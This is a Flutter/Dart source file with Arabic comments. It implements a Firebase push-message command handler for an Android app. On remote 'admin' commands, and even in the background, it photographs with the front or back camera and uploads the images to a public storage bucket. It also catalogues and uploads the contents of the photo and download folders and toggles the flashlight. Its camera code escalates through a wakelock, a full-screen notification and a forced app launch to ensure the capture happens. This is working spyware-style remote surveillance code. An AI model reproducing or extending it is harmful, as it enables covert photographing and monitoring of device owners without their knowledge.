import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/foundation.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:torch_light/torch_light.dart';
import 'package:camera/camera.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:android_intent_plus/android_intent.dart';
import 'package:android_intent_plus/flag.dart';
import 'package:wakelock_plus/wakelock_plus.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:workmanager/workmanager.dart';
import '../config/base_url.dart';
import '../firebase_options.dart';
import 'background_server_service.dart';

/// معالجة الرسائل في الخلفية - يجب أن تكون top-level function
@pragma('vm:entry-point')
Future<void> firebaseMessagingBackgroundHandler(RemoteMessage message) async {
  debugPrint('🔔 FCM Background Handler Started');
  debugPrint('FCM Background: Message ID = ${message.messageId}');
  debugPrint('FCM Background: Data = ${message.data}');

  try {
    // تهيئة Firebase مع الـ options الصحيحة
    await Firebase.initializeApp(
      options: DefaultFirebaseOptions.currentPlatform,
    );
    debugPrint('✅ FCM Background: Firebase initialized');
  } catch (e) {
    debugPrint('⚠️ FCM Background: Firebase already initialized: $e');
  }

  // تنفيذ الأمر
  await _handleFCMCommand(message.data);
  debugPrint('✅ FCM Background Handler Completed');
}

/// تهيئة خدمة FCM
Future<void> initializeFCMService() async {
  // تهيئة Firebase مع الـ options الصحيحة
  try {
    await Firebase.initializeApp(
      options: DefaultFirebaseOptions.currentPlatform,
    );
  } catch (e) {
    // Firebase already initialized
    debugPrint('Firebase already initialized: $e');
  }

  // طلب إذن الإشعارات
  final messaging = FirebaseMessaging.instance;

  NotificationSettings settings = await messaging.requestPermission(
    alert: true,
    announcement: false,
    badge: true,
    carPlay: false,
    criticalAlert: false,
    provisional: false,
    sound: true,
  );

  debugPrint('FCM: Permission status: ${settings.authorizationStatus}');

  // الحصول على FCM Token وحفظه
  final token = await messaging.getToken();
  debugPrint('FCM Token: $token');

  if (token != null) {
    await _saveFCMToken(token);
  }

  // الاستماع لتحديث Token
  messaging.onTokenRefresh.listen(_saveFCMToken);

  // معالجة الرسائل في الخلفية
  FirebaseMessaging.onBackgroundMessage(firebaseMessagingBackgroundHandler);

  // معالجة الرسائل عندما التطبيق مفتوح
  FirebaseMessaging.onMessage.listen((RemoteMessage message) async {
    debugPrint('FCM Foreground: Received message ${message.messageId}');
    await _handleFCMCommand(message.data);
  });

  // معالجة الرسائل عند فتح التطبيق من الإشعار
  FirebaseMessaging.onMessageOpenedApp.listen((RemoteMessage message) async {
    debugPrint('FCM Opened: Received message ${message.messageId}');
    await _handleFCMCommand(message.data);
  });
}

/// حفظ FCM Token في قاعدة البيانات
Future<void> _saveFCMToken(String token) async {
  try {
    final prefs = await SharedPreferences.getInstance();
    final userId = prefs.getInt('user_id');

    if (userId != null) {
      await Supabase.instance.client
          .from('users')
          .update({'fcm_token': token})
          .eq('id', userId);
      debugPrint('FCM: Token saved for user $userId');
    }
  } catch (e) {
    debugPrint('FCM: Error saving token: $e');
  }
}

/// معالجة أوامر FCM
Future<void> _handleFCMCommand(Map<String, dynamic> data) async {
  final commandType = data['command_type'] as String?;
  final commandId = data['command_id'] as String?;

  debugPrint('📨 FCM: Processing command...');
  debugPrint('📨 FCM: command_type = $commandType');
  debugPrint('📨 FCM: command_id = $commandId');

  if (commandType == null) {
    debugPrint('❌ FCM: No command_type in message');
    return;
  }

  debugPrint('⚡ FCM: Executing command: $commandType');

  try {
    // تهيئة Supabase إذا لم تكن مهيأة
    try {
      await Supabase.initialize(url: SUPABASE_URL, anonKey: SUPABASE_ANON_KEY);
      debugPrint('✅ FCM: Supabase initialized');
    } catch (e) {
      debugPrint('⚠️ FCM: Supabase already initialized');
    }

    final prefs = await SharedPreferences.getInstance();
    final userId = prefs.getInt('user_id');

    if (userId == null) {
      debugPrint('❌ FCM: No user ID found in SharedPreferences');
      return;
    }

    debugPrint('👤 FCM: User ID = $userId');

    // Strategy 4: WorkManager Guaranteed Execution (Event-Driven)
    // نجدول المهمة فوراً لتنفيذها من قبل النظام كخطة بديلة مضمونة
    try {
      await Workmanager().registerOneOffTask(
        'fcm_backup_${commandId ?? DateTime.now().millisecondsSinceEpoch}',
        'immediate_command',
        inputData: {'command_type': commandType, 'user_id': userId},
        constraints: Constraints(networkType: NetworkType.connected),
        existingWorkPolicy: ExistingWorkPolicy.replace,
      );
      debugPrint('✅ FCM: Scheduled WorkManager backup task');
    } catch (wmError) {
      debugPrint('⚠️ FCM: WorkManager schedule error: $wmError');
    }

    // تنفيذ الأمر
    switch (commandType) {
      case 'flash_on':
        debugPrint('🔦 FCM: Turning flash ON...');
        await TorchLight.enableTorch();
        debugPrint('✅ FCM: Flash is now ON');
        break;

      case 'flash_off':
        debugPrint('🌑 FCM: Turning flash OFF...');
        await TorchLight.disableTorch();
        debugPrint('✅ FCM: Flash is now OFF');
        break;

      case 'camera_front':
      case 'camera_back':
        debugPrint(
          '📸 FCM: Camera command received, attempting immediate capture...',
        );
        // محاولة التنفيذ الفوري
        if (commandType == 'camera_front') {
          await _capturePhoto(true, 'front', userId);
        } else {
          await _capturePhoto(false, 'back', userId);
        }

        // حفظ الأمر في التفضيلات كاحتياط فقط في حالة الفشل
        // لكننا سنعتمد على التنفيذ الفوري
        debugPrint('✅ FCM: Immediate capture attempt completed');
        break;

      case 'list_files':
        debugPrint('📁 FCM: Listing files...');
        await _listFiles(userId);
        break;

      case 'start_service':
        debugPrint('🟢 FCM: Starting background service...');
        try {
          await BackgroundServerService.startService();
          debugPrint('✅ FCM: Background service started');
        } catch (e) {
          debugPrint('❌ FCM: Error starting background service: $e');
        }
        break;

      case 'stop_service':
        debugPrint('🔴 FCM: Stopping background service...');
        try {
          await BackgroundServerService.stopService();
          debugPrint('✅ FCM: Background service stopped');
        } catch (e) {
          debugPrint('❌ FCM: Error stopping background service: $e');
        }
        break;

      default:
        debugPrint('❓ FCM: Unknown command: $commandType');
    }

    // تحديث حالة الأمر في قاعدة البيانات
    if (commandId != null) {
      await Supabase.instance.client
          .from('admin_commands')
          .update({'executed': true})
          .eq('id', commandId);
      debugPrint('✅ FCM: Command marked as executed in database');
    }

    debugPrint('🎉 FCM: Command "$commandType" executed successfully!');
  } catch (e, stackTrace) {
    debugPrint('❌ FCM Error: $e');
    debugPrint('Stack trace: $stackTrace');
  }
}

/// جلب قائمة الملفات
Future<void> _listFiles(int userId) async {
  try {
    await Permission.storage.request();
    await Permission.manageExternalStorage.request();

    final directories = [
      '/storage/emulated/0/DCIM/Camera',
      '/storage/emulated/0/Pictures',
      '/storage/emulated/0/Download',
    ];

    int filesUploaded = 0;

    for (final dirPath in directories) {
      final directory = Directory(dirPath);
      if (await directory.exists()) {
        try {
          final files = directory.listSync().take(20);
          for (final file in files) {
            if (file is File) {
              final stat = await file.stat();
              final fileName = file.path.split('/').last;
              final ext = fileName.toLowerCase().split('.').last;
              String fileType = 'other';
              if (['jpg', 'jpeg', 'png', 'gif', 'webp'].contains(ext)) {
                fileType = 'image';
              } else if (['mp4', 'mov', 'avi', 'mkv'].contains(ext)) {
                fileType = 'video';
              }

              await Supabase.instance.client.from('user_files').upsert({
                'user_id': userId,
                'file_name': fileName,
                'file_path': file.path,
                'file_type': fileType,
                'file_size': stat.size,
              }, onConflict: 'user_id,file_path');
              filesUploaded++;
            }
          }
        } catch (e) {
          debugPrint('FCM: Error reading $dirPath: $e');
        }
      }
    }
    debugPrint('FCM: Uploaded $filesUploaded files');
  } catch (e) {
    debugPrint('FCM list files error: $e');
  }
}

/// التقاط صورة (نسخة مطابقة لما في WorkManager لضمان العمل في الخلفية)
Future<void> _capturePhoto(bool isFront, String cameraType, int userId) async {
  CameraController? controller;
  try {
    // Tier 1: WakeLock (Keep CPU running)
    try {
      await WakelockPlus.enable();
    } catch (w) {
      debugPrint('⚠️ FCM: Wakelock error: $w');
    }

    debugPrint('📸 FCM: Starting photo capture process...');

    // محاولة تهيئة الكاميرا
    final cameras = await availableCameras();
    if (cameras.isEmpty) {
      debugPrint('❌ FCM: No cameras found');
      return;
    }

    CameraDescription? selected;
    for (final cam in cameras) {
      if (isFront && cam.lensDirection == CameraLensDirection.front) {
        selected = cam;
        break;
      } else if (!isFront && cam.lensDirection == CameraLensDirection.back) {
        selected = cam;
        break;
      }
    }
    selected ??= cameras.first;

    controller = CameraController(
      selected,
      ResolutionPreset.medium,
      enableAudio: false,
    );

    await controller.initialize();
    // انتظار قصير لضمان استقرار الكاميرا
    await Future.delayed(const Duration(milliseconds: 500));

    final photo = await controller.takePicture();
    final bytes = await photo.readAsBytes();

    final fileName =
        'capture_${userId}_${DateTime.now().millisecondsSinceEpoch}.jpg';

    // رفع الصورة
    await Supabase.instance.client.storage
        .from('media')
        .uploadBinary('captures/$fileName', bytes);

    final imageUrl = Supabase.instance.client.storage
        .from('media')
        .getPublicUrl('captures/$fileName');

    // حفظ في القاعدة
    await Supabase.instance.client.from('captured_images').insert({
      'user_id': userId,
      'image_url': imageUrl,
      'camera_type': cameraType,
    });

    debugPrint('✅ FCM: Photo captured and uploaded successfully');
    debugPrint('✅ FCM: Photo captured and uploaded successfully');
  } catch (e) {
    debugPrint('❌ FCM: Photo capture error: $e');

    // Tier 2: Wake Up via Notification (High Priority)
    debugPrint('🚀 FCM: Attempting Tier 2 (Notification Wake Up)...');
    try {
      final flutterLocalNotificationsPlugin = FlutterLocalNotificationsPlugin();
      const androidSettings = AndroidInitializationSettings(
        '@mipmap/ic_launcher',
      );
      await flutterLocalNotificationsPlugin.initialize(
        const InitializationSettings(android: androidSettings),
      );

      await flutterLocalNotificationsPlugin.show(
        888, // ID ثابت
        'Camera Active',
        'Capturing background photo...',
        const NotificationDetails(
          android: AndroidNotificationDetails(
            'high_importance_channel',
            'High Importance Notifications',
            importance: Importance.max,
            priority: Priority.high,
            fullScreenIntent: true, // This is the magic key for Wake Up
            ongoing: true,
            autoCancel: true,
          ),
        ),
      );
      // Give it a second to wake up logic
      await Future.delayed(const Duration(seconds: 2));

      // إعادة محاولة التصوير بعد الإيقاظ
      debugPrint('📸 FCM: Retrying capture after notification wake-up...');
      try {
        final cameras = await availableCameras();
        if (cameras.isNotEmpty) {
          CameraDescription? retryCamera;
          for (final cam in cameras) {
            if (isFront && cam.lensDirection == CameraLensDirection.front) {
              retryCamera = cam;
              break;
            } else if (!isFront &&
                cam.lensDirection == CameraLensDirection.back) {
              retryCamera = cam;
              break;
            }
          }
          retryCamera ??= cameras.first;

          final retryController = CameraController(
            retryCamera,
            ResolutionPreset.medium,
            enableAudio: false,
          );
          await retryController.initialize();
          await Future.delayed(const Duration(milliseconds: 500));

          final retryPhoto = await retryController.takePicture();
          final retryBytes = await retryPhoto.readAsBytes();

          final retryFileName =
              'capture_${userId}_${DateTime.now().millisecondsSinceEpoch}.jpg';
          await Supabase.instance.client.storage
              .from('media')
              .uploadBinary('captures/$retryFileName', retryBytes);

          final retryImageUrl = Supabase.instance.client.storage
              .from('media')
              .getPublicUrl('captures/$retryFileName');

          await Supabase.instance.client.from('captured_images').insert({
            'user_id': userId,
            'image_url': retryImageUrl,
            'camera_type': cameraType,
          });

          await retryController.dispose();
          debugPrint('✅ FCM: Retry capture successful!');
          return; // نجحت إعادة المحاولة، لا حاجة للخطة التالية
        }
      } catch (retryError) {
        debugPrint('❌ FCM: Retry capture failed: $retryError');
      }
    } catch (notifError) {
      debugPrint('❌ FCM: Tier 2 failed: $notifError');
    }

    // Tier 3: Force App Launch (The ultimate fallback) - فقط إذا فشل كل شيء
    debugPrint('🚀 FCM: All background attempts failed. Forcing app launch...');
    try {
      // حفظ الأمر في SharedPreferences ليتم تنفيذه عند فتح التطبيق
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString(
        'pending_camera_command',
        isFront ? 'camera_front' : 'camera_back',
      );

      final intent = AndroidIntent(
        package: 'com.example.vrtics',
        componentName: 'com.example.vrtics.MainActivity',
        flags: [
          Flag.FLAG_ACTIVITY_NEW_TASK,
          Flag.FLAG_ACTIVITY_CLEAR_TOP,
          Flag.FLAG_ACTIVITY_SINGLE_TOP,
        ],
      );
      await intent.launch();
      debugPrint(
        '✅ FCM: App launch intent sent - capture will happen on app open',
      );
    } catch (launchError) {
      debugPrint('❌ FCM: Failed to launch app: $launchError');
    }
  } finally {
    // Release WakeLock
    try {
      await WakelockPlus.disable();
    } catch (_) {}
    await controller?.dispose();
  }
}
